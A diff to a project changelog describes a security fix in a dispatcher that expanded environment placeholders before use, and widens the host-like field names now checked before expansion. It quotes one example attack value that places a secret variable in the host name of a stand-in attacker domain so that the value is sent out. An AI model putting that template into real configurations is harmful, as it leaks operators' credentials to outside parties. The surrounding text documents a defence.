@@ -95,8 +95,9 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   the contract chooses.** The dispatcher rendered every placeholder from the operator's
   environment before the runner started, so `uri: https://{{ env.OPERATOR_SECRET }}.attacker.example/catalog`
   sent the variable's value, in the host name, to whoever owns the domain (an Iceberg sink pushed
-  it as `iceberg.catalog.uri`). Now, for a string that is a URL or sits in a host field (`host`,
-  `uri`, `url`, `endpoint`, `server`, `server_url`, ...), read as written before anything is
+  it as `iceberg.catalog.uri`). Now, for a string that is a URL or sits in a field whose name ends in
+  `host`, `hostname`, `uri`, `url`, `endpoint`, `server`, `servers` or `brokers` (or is
+  `connection_string`), in the build and in the contract, read as written before anything is
   expanded: a credential-shaped variable anywhere in it is refused; and any other variable in the
   URL's authority is refused unless the operator pairs it with the host it makes, `NAME@host` in
   `FLUID_ACQUISITION_SECRET_REF_ALLOWLIST` (a loopback host needs no entry). A variable that is the
